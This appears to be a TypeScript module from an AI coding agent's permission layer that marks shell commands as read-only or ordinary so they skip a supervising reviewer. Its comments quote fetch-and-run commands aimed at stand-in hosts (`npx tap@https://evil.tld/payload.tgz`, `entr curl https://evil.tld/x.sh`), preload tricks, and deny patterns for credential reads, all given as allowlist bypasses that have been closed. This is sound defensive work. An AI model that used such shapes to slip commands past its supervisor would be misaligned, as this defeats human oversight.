// ─── Mechanical shell classification for Auto mode ───
//
// Auto mode had a "safe" tier for read_file and grep and no equivalent for
// the shell, so `ls -la`, `cat package.json` and `git status` all rated
// medium, all ran under the supervised tier, and every one of them cost a
// background reviewer call. On a rate-capped reviewer that call is what made
// the mode feel slow: the supervisor competed with the acting agent for the
// same quota, and it flagged `npm audit` and `npm run test:e2e` as suspicious
// after they ran.
//
// This module answers two questions with no model in the loop:
//
//   isReadOnlyShellCommand   every segment is a known read-only program, no
//                            redirection, no substitution, no sudo — it can
//                            take the safe tier: run, unsupervised, unrecorded.
//   isOrdinaryDevCommand     the day's work: builds, tests, installs, linters,
//                            local git, containers. It still runs under the
//                            supervised tier, but when the supervisor is set
//                            to watch only "unusual" work it is not screened.
//
// Both are precision lists, not heuristics. A false "read-only" would let a
// write skip supervision, so anything the list does not name is not read-only;
// a false "ordinary" only skips a screen the mechanical breakers already ran
// ahead of, so that list can afford to be broader. Users extend the read-only
// set with `[permissions.autoMode] safeCommands`, and the tests are where the
// commands of a real workflow get pinned.

import { commandPatternMatches, splitShellSegments, stripLeadingAssignments } from "@rune/shared";

/** Programs whose only effect is their output. */
const READ_ONLY_PROGRAMS = new Set([
  "ls",
  "cat",
  "head",
  "tail",
  "less",
  "more",
  "wc",
  "pwd",
  "echo",
  "printf",
  "true",
  "false",
  "test",
  "[",
  "cd",
  "grep",
  "egrep",
  "fgrep",
  "rg",
  "ag",
  "ack",
  "fd",
  "tree",
  "stat",
  "file",
  "du",
  "df",
  "which",
  "whereis",
  "type",
  "basename",
  "dirname",
  "realpath",
  "readlink",
  "sort",
  "uniq",
  "cut",
  "tr",
  "column",
  "nl",
  "tac",
  "rev",
  "paste",
  "join",
  "comm",
  "diff",
  "cmp",
  "md5",
  "md5sum",
  "shasum",
  "sha1sum",
  "sha256sum",
  "cksum",
  "date",
  "cal",
  "uname",
  "hostname",
  "whoami",
  "id",
  "uptime",
  "arch",
  "nproc",
  "sw_vers",
  "sysctl",
  "ps",
  "pgrep",
  "lsof",
  "jq",
  "yq",
  "xxd",
  "hexdump",
  "od",
  "strings",
  "awk",
  "sed",
  "seq",
  "yes",
  "sleep",
  "man",
  "tldr",
  "bat",
  "exa",
  "eza",
  "lsb_release",
]);

/** `git <subcommand>` forms that only read the repository. */
const GIT_READ_SUBCOMMANDS = new Set([
  "status",
  "log",
  "diff",
  "show",
  "rev-parse",
  "rev-list",
  "ls-files",
  "ls-tree",
  "blame",
  "describe",
  "shortlog",
  "reflog",
  "cat-file",
  "count-objects",
  "check-ignore",
  "grep",
  "name-rev",
  "merge-base",
  "for-each-ref",
  "show-ref",
  "symbolic-ref",
  "var",
  "version",
  "help",
]);

/** Per-tool read-only subcommands for the toolchains a shell reaches for. */
const TOOL_READ_SUBCOMMANDS: Record<string, Set<string>> = {
  cargo: new Set(["metadata", "tree", "version", "--version", "-V", "--list", "search"]),
  npm: new Set([
    "ls",
    "list",
    "ll",
    "la",
    "root",
    "prefix",
    "bin",
    "why",
    "explain",
    "--version",
    "-v",
  ]),
  pnpm: new Set(["ls", "list", "why", "root", "bin", "--version", "-v"]),
  yarn: new Set(["list", "why", "bin", "--version", "-v"]),
  bun: new Set(["--version", "-v", "--revision"]),
  go: new Set(["version", "env", "list"]),
  docker: new Set([
    "ps",
    "images",
    "logs",
    "inspect",
    "version",
    "info",
    "stats",
    "top",
    "port",
    "diff",
    "history",
  ]),
  kubectl: new Set([
    "get",
    "describe",
    "logs",
    "version",
    "explain",
    "api-resources",
    "top",
    "cluster-info",
  ]),
  adb: new Set(["devices", "version", "get-state", "get-serialno"]),
  brew: new Set([
    "list",
    "info",
    "--version",
    "-v",
    "config",
    "doctor",
    "outdated",
    "deps",
    "search",
  ]),
  python: new Set(["--version", "-V"]),
  python3: new Set(["--version", "-V"]),
  node: new Set(["--version", "-v"]),
  rustc: new Set(["--version", "-V"]),
  rustup: new Set(["show", "--version", "-V", "which"]),
  gh: new Set(["--version", "version"]),
  make: new Set(["--version", "-v"]),
  tsc: new Set(["--version", "-v"]),
};

/** Only-flag invocations that any program answers without side effects. */
const VERSION_OR_HELP_ARGS = new Set([
  "--version",
  "-version",
  "-V",
  "-v",
  "--help",
  "-h",
  "-help",
  "help",
]);

/**
 * Redirection that only routes standard streams to nowhere or to each other
 * is harmless; anything else that contains `>` writes a file.
 */
const HARMLESS_REDIRECT_RE =
  /(?:\d?>&\d|&>\s*\/dev\/null|\d?>\s*\/dev\/null|>\s*\/dev\/stderr|>\s*\/dev\/stdout)/g;

const SUBSTITUTION_RE = /\$\(|`|<\(|>\(/;
const BACKGROUND_OR_ELEVATION_RE =
  /(?:^|\s)(?:sudo|doas|su|exec|eval|source|xargs|nohup|watch)\b|(?:^|[^&>])&(?:\s|$)|^\.\s/;

/** Read-only if EVERY segment is read-only. Empty commands are not. */
export function isReadOnlyShellCommand(
  command: string,
  safeCommands: readonly string[] = [],
): boolean {
  const segments = splitShellSegments(command);
  if (segments.length === 0) return false;
  return segments.every((segment) => isReadOnlySegment(segment, safeCommands));
}

function isReadOnlySegment(rawSegment: string, safeCommands: readonly string[]): boolean {
  const segment = rawSegment.trim();
  if (!segment) return false;
  if (SUBSTITUTION_RE.test(segment)) return false;
  if (BACKGROUND_OR_ELEVATION_RE.test(segment)) return false;
  if (segment.replace(HARMLESS_REDIRECT_RE, "").includes(">")) return false;
  if (safeCommands.some((p) => commandPatternMatches(p, segment))) return true;
  const words = tokenize(stripLeadingAssignments(segment));
  if (words.length === 0) return false;
  const program = words[0]!.replace(/^.*\//, "");
  const args = words.slice(1);
  if (args.length > 0 && args.every((a) => VERSION_OR_HELP_ARGS.has(a))) return true;
  if (program === "git") return isReadOnlyGit(args);
  if (program === "find")
    return !args.some((a) => /^-(?:delete|exec|execdir|ok|okdir|fprint\w*|fls)$/.test(a));
  if (program === "sed") return !args.some((a) => /^-[a-zA-Z]*i|^--in-place/.test(a));
  if (program === "awk" || program === "gawk")
    return !args.some((a) => a === "-i" || a.startsWith("--in-place"));
  const subcommands = TOOL_READ_SUBCOMMANDS[program];
  if (subcommands) return args.length > 0 && subcommands.has(args[0]!);
  return READ_ONLY_PROGRAMS.has(program);
}

function isReadOnlyGit(args: string[]): boolean {
  const positional = args.filter((a) => !a.startsWith("-"));
  const sub = positional[0];
  if (!sub) return false;
  if (GIT_READ_SUBCOMMANDS.has(sub)) return true;
  switch (sub) {
    case "branch":
      // Listing forms only: a positional after `branch` creates one; -d/-D/-m/-M change refs.
      return (
        positional.length === 1 &&
        !args.some(
          (a) =>
            /^-(?:d|D|m|M|c|C|u|f|--delete|--move|--copy|--set-upstream-to|--unset-upstream|--force)$/.test(
              a,
            ) || /^--(?:delete|move|copy|set-upstream-to|unset-upstream|force)$/.test(a),
        )
      );
    case "tag":
      return (
        positional.length === 1 &&
        !args.some(
          (a) =>
            /^-[a-zA-Z]*[adfmsu]/.test(a) || /^--(?:delete|force|annotate|sign|message)$/.test(a),
        ) &&
        (args.length === 1 ||
          args.some(
            (a) =>
              a === "-l" ||
              a === "--list" ||
              a.startsWith("--contains") ||
              a.startsWith("--points-at") ||
              a.startsWith("--sort"),
          ))
      );
    case "stash":
      return positional[1] === "list" || positional[1] === "show";
    case "worktree":
      return positional[1] === "list";
    case "remote":
      return positional.length === 1 || positional[1] === "show" || positional[1] === "get-url";
    case "config":
      return args.some(
        (a) =>
          a === "--get" ||
          a === "--get-all" ||
          a === "--list" ||
          a === "-l" ||
          a === "--get-regexp",
      );
    default:
      return false;
  }
}

// ── Ordinary development work ──

/**
 * The build-and-check tools of a JavaScript workspace, named once so the bare
 * invocation (`tsc --noEmit`) and the package-runner one (`npx tsc --noEmit`)
 * cannot drift apart.
 */
const DEV_TOOLS =
  "tsc|eslint|prettier|biome|oxlint|stylelint|vitest|jest|mocha|ava|tap|karma|cypress|" +
  "playwright|turbo|nx|lerna|rollup|vite|webpack|esbuild|parcel|next|nuxt|astro|remix|" +
  "storybook|tailwindcss|postcss|sass|shellcheck|hadolint|yamllint|markdownlint|" +
  "commitlint|husky|lint-staged";

const ORDINARY_PATTERNS: RegExp[] = [
  /^(?:npm|pnpm|yarn|bun)\s+(?:install|i|ci|add|remove|rm|uninstall|update|upgrade|test|t|run|run-script|build|lint|typecheck|check|format|fmt|dev|start|stop|restart|watch|clean|generate|gen|coverage|bench|preview|serve|storybook|prepare|migrate|seed|audit|dedupe|prune|outdated|ls|list|why|init|pack|version|link|rebuild|cache|pm|docs|doctor)\b/,
  // `yarn <script>`, `pnpm <script>`, `bun <script>` run a package.json
  // script without `run`. The excluded verbs fetch and execute code from
  // outside the project (dlx/x/exec/create/npx) or publish it.
  /^(?:pnpm|yarn|bun)\s+(?!publish\b|dlx\b|x\b|exec\b|create\b|npx\b|link\b)[\w:.-]+(?:\s|$)/,
  /^(?:pip3?|uv|poetry|pipenv|conda|pipx)\s+(?:install|uninstall|sync|run|lock|add|remove|update|list|show|freeze|check|build|venv|pip)\b/,
  /^(?:pytest|py\.test|tox|nox|coverage|ruff|black|isort|flake8|mypy|pyright|pylint|bandit)\b/,
  /^python3?(?:\s+-m\s+(?:pytest|unittest|venv|pip|build|http\.server|json\.tool|mypy|black|ruff|compileall|py_compile)\b|\s+-[cu]\s|\s+\S+\.py\b)/,
  /^(?:node|bun|deno|tsx|ts-node)\s+(?:-e\s|--eval\s|-p\s|run\s|\S+\.(?:m?[jt]sx?|cjs)\b)/,
  // `node --check <file>` parses the file and exits without running a line of
  // it, which is why it is here and why nothing else is. Admitting leading
  // flags generally — which is what this line used to do — admitted the flags
  // that EXECUTE: `node --require ./evil.js app.js` preloads a module before
  // the script, `node -r /tmp/payload.js` needs no script at all, and
  // `--experimental-permission --allow-fs-write=/` widens a sandbox rather
  // than narrowing it. One flag, one file, nothing after it.
  /^node\s+--check\s+\S+\.(?:m?[jt]sx?|cjs)\s*$/,
  // `node --test [file…]` runs the named files — or, with none, the project's
  // own test files — under Node's test runner. That is `node <file>` and
  // `npm test`, both of which are above. Held to the same rule as `--check`:
  // this one flag, script files, nothing else. `node --test --require ./x.js`
  // is not this line.
  /^node\s+--test(?:\s+\S+\.(?:m?[jt]sx?|cjs))*\s*$/,
  /^cargo\s+(?:build|b|test|t|check|c|clippy|fmt|run|r|bench|doc|clean|update|fetch|add|remove|rm|tree|metadata|install\s+--path|generate-lockfile|nextest)\b/,
  /^(?:rustc|rustfmt|rustup\s+(?:show|default|update|target|component|toolchain))\b/,
  /^go\s+(?:build|test|vet|run|mod|fmt|generate|get|install|list|env|version|tool|clean|work)\b/,
  /^(?:gofmt|goimports|golangci-lint|staticcheck)\b/,
  /^(?:make|cmake|ninja|meson|bazel|buck2?|gradle|gradlew|\.\/gradlew|mvn|mvnw|\.\/mvnw|ant|sbt|lein|mix|rebar3|xcodebuild|xcrun|swift|dotnet|msbuild|bundle|rake|rails|composer|php|artisan|flutter|dart|expo|eas|fastlane|pod)\b/,
  new RegExp(String.raw`^(?:${DEV_TOOLS})\b`),
  /^git\s+(?:add|commit|checkout|switch|restore|merge|rebase(?!\s+-i\b|\s+--interactive\b)|cherry-pick|stash|branch|tag|reset(?!\s+--hard\b)|fetch|pull|init|mv|rm|clean|worktree|submodule|apply|am|revert|bisect|notes|format-patch|diff|log|status|show|remote|config)\b/,
  /^docker\s+(?:build|buildx|compose|ps|images|logs|run|exec|create|stop|start|restart|kill|rm|rmi|pull|inspect|version|info|cp|tag|load|save|network|volume\s+(?:ls|create|inspect)|stats|top)\b/,
  /^(?:docker-compose|podman|colima|kind|minikube|helm\s+(?:template|lint|dependency|list|status|show|version))\b/,
  /^(?:mkdir|touch|cp|mv|rm|rmdir|ln|chmod|chown|tar|zip|unzip|gzip|gunzip|bzip2|xz|zstd|patch|install|rsync)\b/,
  /^(?:adb|emulator|avdmanager|sdkmanager|xcrun\s+simctl|ios-deploy|idb)\b/,
  /^(?:curl|wget|http|https|xh)\b.*(?:localhost|127\.0\.0\.1|\[::1\]|0\.0\.0\.0)/,
  /^(?:sleep|wait|timeout|time|env|printenv|export|set|unset|alias|source|\.)\b/,
  // `command -v prettier` asks whether a program exists, which is `which
  // prettier`. Only that form: `command <program>` RUNS the program.
  /^command\s+-[vV]\s+[\w./+-]+\s*$/,
  /^(?:sqlite3|psql|mysql|redis-cli|mongosh)\b/,
  /^(?:\.\/|\.\.\/|scripts\/|bin\/)\S+/,
  // A package runner in front of a tool this list already names: `npx
  // playwright test`, `bun x tsc --version`. The tool name must be the WHOLE
  // token — `\b` ends at a hyphen and at an `@`, so the first version of this
  // line cleared `npx tsc-evil-backdoor`, `npx vite-plugin-exfil` and
  // `npx tap@https://evil.tld/payload.tgz`, every one of which fetches and
  // runs a stranger's code. `--package`/`-p` are gone from the flag list for
  // the same reason: that flag names the package the binary is run FROM, so
  // `npx -p evil-package tsc` runs `evil-package`, not tsc.
  new RegExp(
    String.raw`^(?:npx|bunx|pnpm\s+dlx|yarn\s+dlx|bun\s+x|npm\s+exec\s+--)\s+` +
      String.raw`(?:(?:-y|--yes|--no-install|--no)\s+)*(?:${DEV_TOOLS})(?![\w@./:+-])`,
  ),
  // Reading a forge through its CLI: `gh pr view`, `gh run list`. A
  // destructive verb anywhere in the command already rates the whole thing
  // high (isRemoteMutation), and `gh release create` / `gh gist create` are
  // publications, so neither ever reaches this line. `download` is NOT a read:
  // `gh run download` and `gh release download` write remote bytes into the
  // workspace, which is a fetch, not a look.
  /^(?:gh|glab)\s+(?:pr|mr|issue|run|repo|project|release|workflow|label|milestone|cache|codespace|extension)\s+(?:view|list|status|checks|diff|watch)(?![\w-])/,
  /^(?:gh|glab)\s+(?:status|search|version)\b/,
  // Enumerating cloud resources: `aws s3 ls`, `aws ec2 describe-instances`,
  // `gcloud compute instances list`. `get` is deliberately NOT a verb here —
  // `get-secret-value`, `get-parameter`, `get-session-token` are all reads of
  // a credential — and the subject has to be a resource: an identity or
  // credential subject is refused by `CLOUD_IDENTITY_SUBJECT_RE` before this
  // line is reached, because the VERB cannot tell `list-buckets` from
  // `list-access-keys`.
  /^(?:aws|gcloud|az|doctl)\s+[\w-]+(?:\s+[\w-]+)?\s+(?:describe|describe-[\w-]+|list|list-[\w-]+|show|ls)(?![\w-])/,
  // A local server, and only a server. The first version of this line named
  // twenty programs and twelve of them were general-purpose command runners —
  // `entr`, `watchexec`, `just`, `mise`, `direnv`, `pm2`, `foreman`,
  // `overmind`, `honcho`, `concurrently`, `air`, `celery` — each of which runs
  // whatever command it is handed, so `entr curl https://evil.tld/x.sh` and
  // `pm2 start /tmp/evil.sh` cleared with nothing watching. `nodemon` is out
  // for the same reason (`--exec`). What is left is the set that serves a
  // directory or an app object and cannot exec an arbitrary program; binding
  // past loopback is answered separately by `beyond-loopback-bind`.
  /^(?:uvicorn|gunicorn|hypercorn|daphne|waitress-serve|flask|http-server|live-server|serve)\b/,
];

// ── The same command, written another way ──
//
// The list above is read against a segment's first word, and three ordinary
// ways of writing a check put something else there:
//
//   node <<'NODE' … NODE                a script on standard input: `node -e`
//   python3 - <<'PY' … PY               the same: `python3 -c`
//   for f in a.js b.js; do node --check "$f" || exit; done
//                                       `node --check a.js`, `node --check b.js`
//
// Recorded 2026-10-09 on three small page builds
// (`~/rune-evidence/design-ab2-20261008`): of the seventeen background screens
// those runs paid for, eight were a command made only of these and of lines
// the list already had, and each screen re-read the run's whole action
// history — eight to fifteen thousand tokens — to clear a syntax check. Each
// shape is rewritten here into the commands it stands for and then read by the
// same list. Nothing is admitted that the list does not already admit in its
// other spelling, and the mechanical breakers still read the command exactly
// as it was typed.

/** Stands where a literal here-document was. NUL cannot occur in a command. */
const HEREDOC_MARK = "\u0000heredoc\u0000";

/**
 * An interpreter given its script on standard input and nothing else. The
 * body is program text, exactly as the argument of `-e` / `-c` is.
 *
 * Only the forms that do read a script there: `node` and `python` take one
 * with no argument or with `-`; `bun` and `deno` only as `run -`. Bare `bun`
 * and bare `deno` do something else with standard input, and are not named.
 */
const INTERPRETER_HEREDOC_RE = new RegExp(
  String.raw`^(?:node(?:\s+--input-type=(?:module|commonjs))?(?:\s+-)?|python3?(?:\s+-)?|(?:bun|deno)\s+run\s+-)\s*${HEREDOC_MARK}$`,
);

/** Leaving a loop or the script: control, with no effect of its own. */
const CONTROL_WORD_RE = /^(?:exit|break|continue)(?:\s+\d{1,3})?$/;

/**
 * The command with the body of every LITERAL here-document taken out and a
 * mark left where its operator stood, or the command unchanged when it holds a
 * here-document this cannot account for.
 *
 * Literal means the delimiter is quoted (`<<'EOF'`, `<<"EOF"`): the shell
 * passes such a body through untouched. An unquoted delimiter is expanded —
 * `$(…)` inside it RUNS — so that body is shell text and is left where the
 * segment reader will see it.
 *
 * It has to read the command the way the shell does, because the failure that
 * matters is hiding lines the shell would execute. `<<` inside a quoted string
 * or after a `#` is not an operator, and the lines under it are commands:
 *
 *     echo "<<'A'"          # one echo, then two more commands
 *     rm -rf build
 *     A
 *
 * So quotes, escapes and comments are tracked, and anything unexpected — a
 * quote left open at the end of the operator's line, a body with no closing
 * line — returns the command as it came.
 */
function withoutLiteralHeredocs(command: string): string {
  if (!command.includes("<<") || command.includes("\u0000")) return command;
  let out = "";
  let quote: '"' | "'" | null = null;
  let wordStart = true;
  const pending: Array<{ tag: string; stripTabs: boolean }> = [];
  let i = 0;
  while (i < command.length) {
    const ch = command[i]!;
    if (quote) {
      out += ch;
      if (ch === "\\" && quote === '"' && i + 1 < command.length) out += command[++i]!;
      else if (ch === quote) quote = null;
      i++;
      continue;
    }
    if (ch === "\\" && i + 1 < command.length) {
      out += ch + command[i + 1]!;
      i += 2;
      wordStart = false;
      continue;
    }
    if (ch === "#" && wordStart) {
      const end = command.indexOf("\n", i);
      const stop = end < 0 ? command.length : end;
      out += command.slice(i, stop);
      i = stop;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      out += ch;
      i++;
      wordStart = false;
      continue;
    }
    if (ch === "<" && command[i + 1] === "<") {
      // Anything but a quoted plain word after the operator — an unquoted
      // delimiter, a here-string (`<<<`), a shift inside `$(( ))` — is a
      // shape this does not account for, and the whole command is left alone.
      const operator = /^<<(-?)[ \t]*(['"])([A-Za-z_][A-Za-z0-9_]*)\2/.exec(command.slice(i));
      if (!operator) return command;
      pending.push({ tag: operator[3]!, stripTabs: operator[1] === "-" });
      out += HEREDOC_MARK;
      i += operator[0].length;
      wordStart = false;
      continue;
    }
    if (ch === "\n" && pending.length > 0) {
      let cursor = i + 1;
      for (const doc of pending) {
        let closed = false;
        while (cursor <= command.length) {
          const end = command.indexOf("\n", cursor);
          const stop = end < 0 ? command.length : end;
          const line = command.slice(cursor, stop);
          cursor = stop + 1;
          if ((doc.stripTabs ? line.replace(/^\t+/, "") : line) === doc.tag) {
            closed = true;
            break;
          }
          if (end < 0) break;
        }
        if (!closed) return command;
      }
      pending.length = 0;
      out += "\n";
      i = Math.min(cursor, command.length);
      wordStart = true;
      continue;
    }
    out += ch;
    wordStart = /\s|[;&|(]/.test(ch);
    i++;
  }
  // An operator with no body under it, or a quote that never closed: not a
  // shape this accounts for.
  if (quote || pending.length > 0) return command;
  return out;
}

/** A loop's words, when every one of them is plain text the shell passes through. */
const LITERAL_WORDS_RE = /^[\w./@:+,=%-]+(?:[ \t]+[\w./@:+,=%-]+)*$/;

/**
 * Segments with every `for NAME in WORDS; do …; done` over literal words
 * replaced by its body, once per word, or null when a loop does not close.
 *
 * Only that loop. A list the shell would expand (`*.js`, `$(ls)`, `"$@"`), a
 * loop inside a loop, and `while`/`until`/`if` are left as they are, and their
 * keywords fail the list below like any other unrecognized command.
 */
function unrollLiteralLoops(segments: string[]): string[] | null {
  const out: string[] = [];
  let loop: { name: string; words: string[] } | null = null;
  for (const segment of segments) {
    if (!loop) {
      const head = /^for[ \t]+([A-Za-z_]\w*)[ \t]+in[ \t]+(.+)$/.exec(segment);
      if (head && LITERAL_WORDS_RE.test(head[2]!.trim())) {
        loop = { name: head[1]!, words: head[2]!.trim().split(/[ \t]+/) };
        continue;
      }
      out.push(segment);
      continue;
    }
    if (segment === "done") {
      loop = null;
      continue;
    }
    if (segment === "do") continue;
    const body =
      segment.startsWith("do ") || segment.startsWith("do\t") ? segment.slice(3) : segment;
    const name = loop.name;
    const whole = new RegExp(String.raw`"\$(?:${name}|\{${name}\})"`, "g");
    const bare = new RegExp(String.raw`\$(?:\{${name}\}|${name}(?!\w))`, "g");
    if (!bare.test(body)) {
      out.push(body.trim());
      continue;
    }
    for (const word of loop.words) {
      out.push(
        body
          .replace(whole, () => word)
          .replace(bare, () => word)
          .trim(),
      );
    }
  }
  return loop ? null : out;
}

/**
 * True when every segment is either read-only or recognized ordinary
 * development work. Patterns are anchored to a segment's first word so an
 * unusual program later in a pipeline still counts as unusual.
 */
export function isOrdinaryDevCommand(
  command: string,
  safeCommands: readonly string[] = [],
): boolean {
  const segments = unrollLiteralLoops(splitShellSegments(withoutLiteralHeredocs(command)));
  if (!segments || segments.length === 0) return false;
  return segments.every((raw) => {
    // What is under a here-document is hidden from every pattern below, so a
    // segment that carries one is ordinary in exactly one shape and no other:
    // `docker exec -i box sh <<'EOF'` is not `docker exec`.
    if (raw.includes(HEREDOC_MARK)) {
      return INTERPRETER_HEREDOC_RE.test(stripLeadingAssignments(raw.trim()));
    }
    // `! grep -q x file` is `grep -q x file` with its answer turned round.
    const segment = raw.trim().replace(/^![ \t]+/, "");
    if (isReadOnlySegment(segment, safeCommands)) return true;
    if (SUBSTITUTION_RE.test(segment) && /\$\((?:curl|wget)\b/.test(segment)) return false;
    const stripped = stripLeadingAssignments(segment);
    // A command that names a secret store is never ordinary, whatever else it
    // looks like. `az keyvault secret show` reads as an enumeration and is a
    // credential read; the pattern list below cannot tell them apart, so the
    // noun does.
    if (SECRET_SUBJECT_RE.test(stripped)) return false;
    if (CLOUD_IDENTITY_SUBJECT_RE.test(stripped)) return false;
    if (CONTROL_WORD_RE.test(stripped)) return true;
    return ORDINARY_PATTERNS.some((re) => re.test(stripped));
  });
}

/** Nouns that mean the command is about a credential rather than a resource. */
const SECRET_SUBJECT_RE =
  /\b(?:secret|secrets|password|passwd|credential|credentials|token|keyvault|keychain|keyring|kms)\b|\bsecretsmanager\b/i;

/**
 * A cloud command whose SUBJECT is the account's own identity rather than a
 * resource in it.
 *
 * The enumeration pattern reads the verb, and the verb is not enough: `aws iam
 * list-access-keys` is a `list-`, and what it lists is a user's credentials.
 * Two subjects are refused — the service (`auth`, `iam`, `sts`, `ssm`,
 * `config`, `account`, `ad`…), which is what makes `gcloud auth list` and
 * `az account list` unusual, and a credential noun anywhere in the line, which
 * is what catches the noun buried inside a hyphenated verb
 * (`list-access-keys`) or trailing it (`az storage account keys list`).
 */
const CLOUD_IDENTITY_SUBJECT_RE =
  /^(?:aws|gcloud|az|doctl)\s+(?:auth|config|configure|iam|sts|ssm|account|accounts|ad|acm|signer|identity)(?![\w-])|^(?:aws|gcloud|az|doctl)\b[\s\S]*\b(?:keys?|credentials?|tokens?|parameters?|passwords?|service-accounts?)\b/i;

/** Whitespace tokenizer that keeps quoted arguments whole (and strips the quotes). */
export function tokenize(segment: string): string[] {
  const out: string[] = [];
  let current = "";
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i]!;
    if (quote) {
      if (ch === quote) quote = null;
      else current += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      continue;
    }
    if (/\s/.test(ch)) {
      if (current) out.push(current);
      current = "";
      continue;
    }
    current += ch;
  }
  if (current) out.push(current);
  return out;
}
